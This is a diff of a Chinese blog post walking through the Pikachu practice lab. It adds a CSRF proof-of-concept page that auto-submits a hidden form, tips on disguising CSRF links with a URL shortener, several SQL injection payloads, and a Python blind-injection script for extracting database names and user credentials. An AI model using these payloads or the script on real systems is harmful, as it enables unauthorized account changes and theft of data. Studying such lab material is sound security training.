@@ -60,8 +60,43 @@
 <meta property="og:image" content="http://example.com/images/image-20231206223715105.png">
 <meta property="og:image" content="http://example.com/images/image-20231206223839726.png">
 <meta property="og:image" content="http://example.com/images/image-20231206223913025.png">
+<meta property="og:image" content="http://example.com/images/image-20231220161155042.png">
+<meta property="og:image" content="http://example.com/images/image-20231220161703905.png">
+<meta property="og:image" content="http://example.com/images/image-20231220161916886.png">
+<meta property="og:image" content="http://example.com/images/image-20231220162410538.png">
+<meta property="og:image" content="http://example.com/images/image-20231220163418767.png">
+<meta property="og:image" content="http://example.com/images/image-20231220162947673.png">
+<meta property="og:image" content="http://example.com/images/image-20231220174445622.png">
+<meta property="og:image" content="http://example.com/images/image-20231220175051970.png">
+<meta property="og:image" content="http://example.com/images/image-20231220175229313.png">
+<meta property="og:image" content="http://example.com/images/image-20231220221023494.png">
+<meta property="og:image" content="http://example.com/images/image-20231220221207664.png">
+<meta property="og:image" content="http://example.com/images/image-20231220221255898.png">
+<meta property="og:image" content="http://example.com/images/image-20231220221412490.png">
+<meta property="og:image" content="http://example.com/images/image-20231220221627954.png">
+<meta property="og:image" content="http://example.com/images/image-20231220221938123.png">
+<meta property="og:image" content="http://example.com/images/image-20231220215319810.png">
+<meta property="og:image" content="http://example.com/images/image-20231220215453195.png">
+<meta property="og:image" content="http://example.com/images/image-20231220215528642.png">
+<meta property="og:image" content="http://example.com/images/image-20231220220558225.png">
+<meta property="og:image" content="http://example.com/images/image-20231220220629940.png">
+<meta property="og:image" content="http://example.com/images/image-20231220224609709.png">
+<meta property="og:image" content="http://example.com/images/image-20231220224635544.png">
+<meta property="og:image" content="http://example.com/images/image-20231220224923024.png">
+<meta property="og:image" content="http://example.com/images/image-20231221144716137.png">
+<meta property="og:image" content="http://example.com/images/image-20231221144703240.png">
+<meta property="og:image" content="http://example.com/images/image-20231221145139066.png">
+<meta property="og:image" content="http://example.com/images/image-20231221145221992.png">
+<meta property="og:image" content="http://example.com/images/image-20231221145257145.png">
+<meta property="og:image" content="http://example.com/images/image-20231221150823109.png">
+<meta property="og:image" content="http://example.com/images/image-20231221154114417.png">
+<meta property="og:image" content="http://example.com/images/image-20231221154824012.png">
+<meta property="og:image" content="http://example.com/images/image-20231221155050249.png">
+<meta property="og:image" content="http://example.com/images/image-20231221155427857.png">
+<meta property="og:image" content="http://example.com/images/image-20231221155910766.png">
+<meta property="og:image" content="http://example.com/images/image-20231221160005547.png">
 <meta property="article:published_time" content="2023-12-04T10:16:11.000Z">
-<meta property="article:modified_time" content="2023-12-17T08:26:57.413Z">
+<meta property="article:modified_time" content="2023-12-21T08:06:28.975Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content=".">
 <meta name="twitter:card" content="summary_large_image">
@@ -300,7 +335,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.3k 字
+          9.3k 字
         
       </span>
     
@@ -311,7 +346,7 @@
         
         
         
-          28 分钟
+          78 分钟
         
       </span>
     
@@ -502,6 +537,122 @@
 <p>发现添加成功，看源码<strong>op2_admin_edit.php</strong></p>
 <p><img src="/../images/image-20231206223913025.png" srcset="/img/loading.gif" lazyload alt="image-20231206223913025"></p>
 <p>可见访问该文件实现功能前的验证只是验证了用户是否是登录，连用户等级和跳转来源都没验证这就造成了越权漏洞</p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title=".CSRF"></a>.CSRF</h3><p>CSRF是Cross-site request forgery是攻击者通过伪造权限数据包，利用目标自身在登录拥有权限状态下去发送攻击者的数据包造成数据的操作。事实上就是让目标自己去操作攻击者做好的操作。</p>
+<h4 id="get"><a href="#get" class="headerlink" title="get"></a><strong>get</strong></h4><p><img src="/../images/image-20231220161155042.png" srcset="/img/loading.gif" lazyload alt="image-20231220161155042"></p>
+<p>利用已有账号登录看出功能点，发现是可以修改自己的信息。尝试抓包:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=sex&amp;phonenum=phone&amp;add=adress&amp;email=email&amp;submit=submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=sex&amp;phonenum=phone&amp;add=ad&amp;email=&amp;submit=submit<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=tsocr2tb2jn5u7guhnipjckg93<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure>
+
+<p>可以看到URL上包含有要修改的信息</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">GET <span class="hljs-keyword">/pikachu/</span>vul<span class="hljs-keyword">/csrf/</span>csrfget/csrf_get_edit.php?<span class="hljs-attr">sex</span><span class="hljs-operator">=</span>sex<span class="hljs-variable">&amp;phonenum</span>=phone<span class="hljs-variable">&amp;add</span>=adress<span class="hljs-variable">&amp;email</span>=email<span class="hljs-variable">&amp;submit</span>=submit HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure>
+
+<p>现在数据包未发出，尝试访问这个URL:</p>
+<p><img src="/../images/image-20231220161703905.png" srcset="/img/loading.gif" lazyload alt="image-20231220161703905"></p>
+<p>可以看到信息成功被修改,这样就可以断定后端在对信息修改的时候没有做严格的身份验证:</p>
+<p>我们尝试登录另一个账号allen</p>
+<p><img src="/../images/image-20231220161916886.png" srcset="/img/loading.gif" lazyload alt="image-20231220161916886"></p>
+<p>然后构造一个修改信息的链接</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-keyword">/pikachu/</span>vul<span class="hljs-keyword">/csrf/</span>csrfget/csrf_get_edit.php?<span class="hljs-attr">sex</span><span class="hljs-operator">=</span>sex<span class="hljs-variable">&amp;phonenum</span>=phone<span class="hljs-variable">&amp;add</span>=adress<span class="hljs-variable">&amp;email</span>=email<span class="hljs-variable">&amp;submit</span>=submit<br></code></pre></td></tr></table></figure>
+
+<p>这个时候allen在登录的状态下访问了该链接</p>
+<p><img src="/../images/image-20231220162410538.png" srcset="/img/loading.gif" lazyload alt="image-20231220162410538"></p>
+<p>发现allen成功修改了自己的信息</p>
+<p>看一下源码:</p>
+<p><img src="/../images/image-20231220163418767.png" srcset="/img/loading.gif" lazyload alt="image-20231220163418767"></p>
+<p>可以看到修改信息的部分只是简单的判断了是否在登录状态并没有判断访问来源或者别的验证</p>
+<p>在实战中攻击者会通过伪装该链接来骗取目标去点击</p>
+<p>可以通过该网站:<a target="_blank" rel="noopener" href="https://wsc.fit/">在线短链生成器 </a></p>
+<p><img src="/../images/image-20231220162947673.png" srcset="/img/loading.gif" lazyload alt="image-20231220162947673"></p>
+<p>这样目标就难以看出真实链接的目的了</p>
+<h4 id="post"><a href="#post" class="headerlink" title="post"></a><strong>post</strong></h4><p><img src="/../images/image-20231220174445622.png" srcset="/img/loading.gif" lazyload alt="image-20231220174445622"></p>
+<p>本关源码没什么变化只是把传参形式改成post传参而已，还是可以伪造一个链接去诱骗目标</p>
+<p>攻击者主要通过将传参形式改写成post形式再写成一个文件放到自己的一个服务器上让目标来访问该文件时发送数据包</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">                                                                                                       <span class="hljs-comment">&lt;!-- 这个script是用来自动提交表单的 --&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        window.onload = function() &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">        document.getElementById(&quot;submit&quot;).click();</span></span><br><span class="language-xml"><span class="language-handlebars">        &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">    </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>              <br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>    <br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;girl&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;phonenum&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hack&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;usa&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;xiannv@pikachu.com&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br>	            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>/&gt;</span>                    <span class="hljs-comment">&lt;!-- style设置为display:none起到隐藏submit按钮的作用 --&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>再放入服务器中，假设文件路径就是:</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/pikachu/vul/csrf/csrfpost/html<br></code></pre></td></tr></table></figure>
+
+<p>目标访问链接后自动发送数据包实现攻击</p>
+<p><img src="/../images/image-20231220175051970.png" srcset="/img/loading.gif" lazyload alt="image-20231220175051970"></p>
+<h4 id="token"><a href="#token" class="headerlink" title="token"></a><strong>token</strong></h4><p><img src="/../images/image-20231220175229313.png" srcset="/img/loading.gif" lazyload alt="image-20231220175229313"></p>
+<h3 id="SQL"><a href="#SQL" class="headerlink" title=".SQL"></a>.SQL</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a><strong>数字型</strong></h4><p>用户通过提交一个数字参数给后台，后台用该数字在数据库中查询。如果没有作严格的过滤就会被攻击者通过拼接sql语句实现其他操作</p>
+<p><img src="/../images/image-20231220221023494.png" srcset="/img/loading.gif" lazyload alt="image-20231220221023494"></p>
+<p>尝试拼接逻辑语句判断时候在true和false时的状态来判断时否存在注入漏洞</p>
+<p><img src="/../images/image-20231220221207664.png" srcset="/img/loading.gif" lazyload alt="image-20231220221207664"></p>
+<p>当bool值为false时查询不到结果</p>
+<p><img src="/../images/image-20231220221255898.png" srcset="/img/loading.gif" lazyload alt="image-20231220221255898"></p>
+<p>ture时正常说明存在注入漏洞</p>
+<p><img src="/../images/image-20231220221412490.png" srcset="/img/loading.gif" lazyload alt="image-20231220221412490"></p>
+<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a><strong>字符型</strong></h4><p>在数据库的查询语句中若要查询字符就要用引号来</p>
+<p><img src="/../images/image-20231220221627954.png" srcset="/img/loading.gif" lazyload alt="image-20231220221627954"></p>
+<p>所在要闭合就要加多引号</p>
+<p><img src="/../images/image-20231220221938123.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a><strong>搜索型</strong></h4><p>搜素型实现的功能就是对用户输入的内容在数据库中搜索并返回给用户，但用户输入的关键词往往不全，在后台的数据库中就不能搜索到相关内容，于是就要使用**%**通配符来实现模糊匹配.这样才能搜索到相关的内容</p>
+<p><img src="/../images/image-20231220215319810.png" srcset="/img/loading.gif" lazyload alt="image-20231220215319810"></p>
+<p>了解基本功能看关卡</p>
+<p><img src="/../images/image-20231220215453195.png" srcset="/img/loading.gif" lazyload alt="image-20231220215453195"></p>
+<p>随便输入s</p>
+<p><img src="/../images/image-20231220215528642.png" srcset="/img/loading.gif" lazyload alt="image-20231220215528642"></p>
+<p>尝试闭合</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">%&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231220220558225.png" srcset="/img/loading.gif" lazyload alt="image-20231220220558225"></p>
+<p><img src="/../images/image-20231220220629940.png" srcset="/img/loading.gif" lazyload alt="image-20231220220629940"></p>
+<p>说明存在搜索型注入</p>
+<p>之后就是利用就行了</p>
+<h4 id="insert-updatae"><a href="#insert-updatae" class="headerlink" title="insert/updatae"></a>insert/updatae</h4><p>往往账户注册或者修改信息都会将信息写入到后台数据库中使用的语句</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">insert</span> into 表名（字段名<span class="hljs-number">1</span>，字段名<span class="hljs-number">2</span>）values（值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>）;<br></code></pre></td></tr></table></figure>
+
+<p>值1/2是用户输入变量，通常是字符所以要用引号，而在语句使用时没有对用户输入的进行转义，攻击者就可以利用特殊字符来闭合语句实现其他操作</p>
+<p><img src="/../images/image-20231220224609709.png" srcset="/img/loading.gif" lazyload alt="image-20231220224609709"></p>
+<p>查看后端代码</p>
+<p><img src="/../images/image-20231220224635544.png" srcset="/img/loading.gif" lazyload alt="image-20231220224635544"></p>
+<p>这里就可以使用单引号闭合前面，但是处于insert语句的语法，后面的语句不能直接注释，所以要用or来实现插入</p>
+<p>' or updatexml(1,concat(0x7e,database()),0) or '</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<p>前后的引号就闭合前后的引号</p>
+<p><img src="/../images/image-20231220224923024.png" srcset="/img/loading.gif" lazyload alt="image-20231220224923024"></p>
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>数据库删除字段的语法:</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 条件;<br></code></pre></td></tr></table></figure>
+
+<p>用户输入在条件处，所以条件处可控</p>
+<p><img src="/../images/image-20231221144716137.png" srcset="/img/loading.gif" lazyload alt="image-20231221144716137"></p>
+<p>尝试输入注入是无效的，抓包删除键</p>
+<p><img src="/../images/image-20231221144703240.png" srcset="/img/loading.gif" lazyload alt="image-20231221144703240"></p>
+<p>发现参数id,猜测可能是利用id来定位要删除的对象，id为数字型尝试数字型注入</p>
+<p><img src="/../images/image-20231221145139066.png" srcset="/img/loading.gif" lazyload alt="image-20231221145139066"></p>
+<p>成功删除，后面查询会报错就用报错注入</p>
+<p><img src="/../images/image-20231221145221992.png" srcset="/img/loading.gif" lazyload alt="image-20231221145221992"></p>
+<p>查看源码</p>
+<p><img src="/../images/image-20231221145257145.png" srcset="/img/loading.gif" lazyload alt="image-20231221145257145"></p>
+<p>发现只对输入的内容进行了转义但是没有对删除的id进行转义</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>bool盲注就是查询的结果不会直接显示出只能靠一个一个的猜，利用回显的值来判断猜测正确与否。</p>
+<p>利用脚本跑出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>header = &#123;<br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;da41ba10-3ba9-4cfb-9326-e6f5276e4315.challenge.ctf.show&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>:<span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>&#125;  <span class="hljs-comment">#伪装头</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_number</span>(<span class="hljs-params">cd</span>):   <span class="hljs-comment">#判断数据库长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>        payload = <span class="hljs-string">&quot;\&#x27; and length((select database()))=%d--+&quot;</span><br>        <span class="hljs-comment">#payload = &quot; and length((select database())=%d--+&quot;</span><br>        T1=time.time()<br>        res = requests.get(url=url+payload%i+<span class="hljs-string">&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2&#x27;</span>)<br>        T2=time.time()<br>        <span class="hljs-comment">#if(T2-T1&gt;=3):</span><br>        <span class="hljs-keyword">if</span>(cd <span class="hljs-keyword">in</span> res.text):<br>           <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库长度为：&quot;</span>,i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_all</span>(<span class="hljs-params">cd,payload</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">128</span>):<br>            T1 = time.time()<br>            res = requests.post(url=url+payload%(i,j)+<span class="hljs-string">&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2&#x27;</span>,headers=header)<br>            T2 = time.time()<br>            <span class="hljs-keyword">if</span>(cd <span class="hljs-keyword">in</span> res.text):<br>            <span class="hljs-comment">#if(T2-T1&gt;=2):</span><br>                name += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;所得值为: %s&#x27;</span> % name)<br>                <span class="hljs-keyword">break</span><br>url=<span class="hljs-string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&quot;</span><br><span class="hljs-comment">#库名:</span><br>payload = <span class="hljs-string">&quot;\&#x27; and ascii(substr(database() from %d for 1))=%d--+&quot;</span><br><span class="hljs-comment">#表名:</span><br><span class="hljs-comment">#payload=&quot;/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d--+&quot;</span><br><span class="hljs-comment">#列名:</span><br><span class="hljs-comment">#payload = &quot;/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;)from/**/%d/**/for/**/1))=%d),sleep(2),1)--+&quot;</span><br><span class="hljs-comment">#值:</span><br><span class="hljs-comment">#payload = &quot;/**/or/**/and/**/ascii(substr((select/**/group_concat(id,username,password)/**/from/**/users)from/**/%d/**/for/**/1))=%d--+&quot;</span><br><br>condition=<span class="hljs-string">&quot;your uid&quot;</span><span class="hljs-comment">#返回条件</span><br>find_number(condition)<span class="hljs-comment">#爆数据库长度</span><br>find_all(condition,payload)<span class="hljs-comment">#爆名</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231221150823109.png" srcset="/img/loading.gif" lazyload alt="image-20231221150823109"></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h4><p>时间盲注就连回显都没有，只能靠操控时间的长短来判断猜测正确与否</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;kobe&#x27; and if(length(database())=%d,sleep(5),0)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果返回为真就延时5秒，就靠着延时来判断出正确的长度或者别的内容</p>
+<p><img src="/../images/image-20231221154114417.png" srcset="/img/loading.gif" lazyload alt="image-20231221154114417"></p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><img src="/../images/image-20231221154824012.png" srcset="/img/loading.gif" lazyload alt="image-20231221154824012"></p>
+<p>注意到参数，点击两个都对传入两个不同的文件名，显示也是不同的文件内容。猜测存在目录遍历查看源码</p>
+<p><img src="/../images/image-20231221155050249.png" srcset="/img/loading.gif" lazyload alt="image-20231221155050249"></p>
+<p>可以看到，对传入的title参数没有做任何过滤直接使用require进行文件包含</p>
+<p><strong><code>require</code> 函数与 <code>include</code> 函数类似</strong>，但它们之间一些重要的区别：</p>
+<ul>
+<li><code>require</code> 函数会在引入文件之前检查文件是否存在，如果文件不存在，则会导致致命错误并停止脚本的执行。而 <code>include</code> 函数只会发出警告并继续执行脚本。</li>
+<li><code>require</code> 函数引入的文件必须是有效的 PHP 代码，否则会导致语法错误并停止脚本的执行。而 <code>include</code> 函数只会发出警告并继续执行脚本。</li>
+</ul>
+<p>利用../回到上一个目录</p>
+<p><img src="/../images/image-20231221155427857.png" srcset="/img/loading.gif" lazyload alt="image-20231221155427857"></p>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>信息泄露是指后台管理员在文件储存的时候由于不严格的限制用户访问位置导致一些敏感的文件可以被用户访问到</p>
+<p><img src="/../images/image-20231221155910766.png" srcset="/img/loading.gif" lazyload alt="image-20231221155910766"></p>
+<p>卡到文件意思是要找到abc文件，一开始在不知道的情况下是可以铜鼓哦利用工具来对目录进行扫描</p>
+<p><img src="/../images/image-20231221160005547.png" srcset="/img/loading.gif" lazyload alt="image-20231221160005547"></p>
+<p>可以看到扫出有abc文件。</p>
+<p>文件扫描是主动扫描，在实战中，如果使用批量的扫描容易被发现，了解一些关于框架的一些配置文件可以通过尝试访问看看是否存在敏感信息.如phpinfo.php为php环境的配置信息或者phpMyAdmin 后台</p>
 
                 
               </div>
